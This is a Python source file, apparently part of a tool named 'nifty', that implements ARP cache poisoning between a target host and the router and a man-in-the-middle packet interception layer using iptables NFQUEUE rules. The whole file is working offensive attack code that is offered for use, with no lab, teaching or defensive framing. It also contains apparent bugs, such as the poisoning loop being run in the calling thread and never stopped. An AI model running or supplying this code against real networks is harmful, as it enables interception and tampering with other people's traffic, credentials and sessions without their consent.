import os
from scapy.all import *
from scapy.layers.l2 import ARP
from nifty.network.utils import get_mac, get_router_ip
from time import sleep
import nifty.config as config
from threading import Thread
from netfilterqueue import NetfilterQueue


class ARPSpoofer():
    def __init__(self, target_ip: str, interface=config.interface, router_ip=get_router_ip()):
        self.target_ip = target_ip
        self.router_ip = router_ip
        self.target_mac = get_mac(self.target_ip, interface)
        self.router_mac = get_mac(self.router_ip, interface)
        self.running = False
        if not self.target_mac:
            raise Exception("Couldn't find target MAC")
        if not self.router_mac:
            raise Exception("Couldn't find router MAC")
        self.poison_thread = None

    def arp_poison(self):
        while self.running:
            send(ARP(op=2, pdst=self.target_ip,
                     psrc=self.router_ip, hwdst=self.target_mac), verbose=False)
            send(ARP(op=2, pdst=self.router_ip,
                     psrc=self.target_ip, hwdst=self.router_mac), verbose=False)
            sleep(3)

    def start(self, verbose=True):
        if verbose:
            print("Starting ARP spoofing...")
        self.poison_thread = Thread(target=self.arp_poison)
        self.running = True
        self.poison_thread.run()

    def stop(self, verbose=True):
        if verbose:
            print("Stopping ARP spoofing...")
        if self.poison_thread:
            self.poison_thread.join(timeout=4)
            if verbose:
                print("ARP spoofing stopped.")

        if verbose:
            print("Restoring targets")
        send(ARP(op=2, pdst=self.router_ip, psrc=self.target_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.target_mac), count=7)
        send(ARP(op=2, pdst=self.target_ip, psrc=self.router_ip,
             hwdst="ff:ff:ff:ff:ff:ff", hwsrc=self.router_mac), count=7)


class MITM():
    
    _registered_queues = []

    def start(callback, interface=config.interface, verbose=True):
        # Find free queue number
        queue_num = 1
        while queue_num in MITM._registered_queues:
            queue_num += 1
        MITM._registered_queues.append(queue_num)
        # Backup iptables
        print("Saving iptables rules to /tmp/iptables.rules")
        os.system("iptables-save > /tmp/iptables.rules")
        # Add iptables rules
        print("Adding iptables rules")
        os.system("iptables -t raw -A PREROUTING -i {} -j NFQUEUE --queue-num {}".format(
            interface,
            queue_num
        ))

        # Start MITM
        nf = NetfilterQueue()
        nf.bind(queue_num, callback)
        try:
            print("Starting NetfilterQueue")
            nf.run()
        except KeyboardInterrupt:
            pass
        nf.unbind()
        # Restore iptables
        print("Restoring iptables rules")
        os.system("iptables-restore < /tmp/iptables.rules")
        print("Restarting firewall")
        os.system("systemctl restart firewalld")

        MITM._registered_queues.remove(queue_num)

